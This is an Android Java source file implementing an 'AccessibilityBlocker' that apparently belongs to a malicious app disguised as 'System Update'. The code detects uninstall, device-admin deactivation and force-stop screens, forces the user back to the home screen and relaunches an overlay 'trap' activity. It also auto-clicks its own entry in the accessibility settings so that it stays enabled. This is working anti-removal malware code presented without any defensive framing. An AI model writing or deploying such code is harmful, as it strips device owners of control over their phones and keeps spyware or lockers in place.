package com.xrc.system.accessibility;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import com.xrc.system.core.Constants;
import com.xrc.system.ui.OverlayActivity;

import java.util.List;

public class AccessibilityBlocker {
    private static final String TAG = Constants.TAG + ":Blocker";
    private final AccessibilityService service;
    private final Handler handler;
    private final String myPackage;

    public AccessibilityBlocker(AccessibilityService service) {
        this.service = service;
        this.handler = new Handler(Looper.getMainLooper());
        this.myPackage = service.getPackageName();
    }

    public void checkAndBlock(AccessibilityNodeInfo root, String currentPackage) {
        if (root == null) return;
        if (isUninstallScreen(root)) {
            blockUninstall();
        }
        if (isDeviceAdminScreen(root)) {
            blockAdminDisable();
        }
        if (isAppInfoScreen(root, currentPackage)) {
            blockAppInfo();
        }
        if (isAccessibilitySettings(root)) {
            ensureSelfEnabled(root);
        }
    }

    private boolean isUninstallScreen(AccessibilityNodeInfo root) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText("Uninstall");
        List<AccessibilityNodeInfo> nodes2 = root.findAccessibilityNodeInfosByText("Uninstall app");
        List<AccessibilityNodeInfo> nodes3 = root.findAccessibilityNodeInfosByText("Remove");
        return !nodes.isEmpty() || !nodes2.isEmpty() || !nodes3.isEmpty();
    }

    private boolean isDeviceAdminScreen(AccessibilityNodeInfo root) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText("Device admin apps");
        List<AccessibilityNodeInfo> nodes2 = root.findAccessibilityNodeInfosByText("Deactivate");
        return !nodes.isEmpty() || !nodes2.isEmpty();
    }

    private boolean isAppInfoScreen(AccessibilityNodeInfo root, String pkg) {
        if (pkg == null) return false;
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(myPackage);
        List<AccessibilityNodeInfo> nodes2 = root.findAccessibilityNodeInfosByText("Force stop");
        return !nodes.isEmpty() && !nodes2.isEmpty();
    }

    private boolean isAccessibilitySettings(AccessibilityNodeInfo root) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText("Accessibility");
        List<AccessibilityNodeInfo> nodes2 = root.findAccessibilityNodeInfosByText("Downloaded apps");
        return !nodes.isEmpty() && !nodes2.isEmpty();
    }

    private void blockUninstall() {
        Log.w(TAG, "Blocking uninstall attempt");
        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
        relaunchTrap();
    }

    private void blockAdminDisable() {
        Log.w(TAG, "Blocking admin disable attempt");
        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
        relaunchTrap();
    }

    private void blockAppInfo() {
        Log.w(TAG, "Blocking app info access");
        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
        relaunchTrap();
    }

    private void ensureSelfEnabled(AccessibilityNodeInfo root) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText("System Update");
        for (AccessibilityNodeInfo node : nodes) {
            AccessibilityNodeInfo parent = node.getParent();
            while (parent != null) {
                if (parent.isClickable()) {
                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    break;
                }
                parent = parent.getParent();
            }
        }
    }

    private void relaunchTrap() {
        handler.postDelayed(() -> {
            Intent intent = new Intent(service, OverlayActivity.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            service.startActivity(intent);
        }, 300);
    }
}
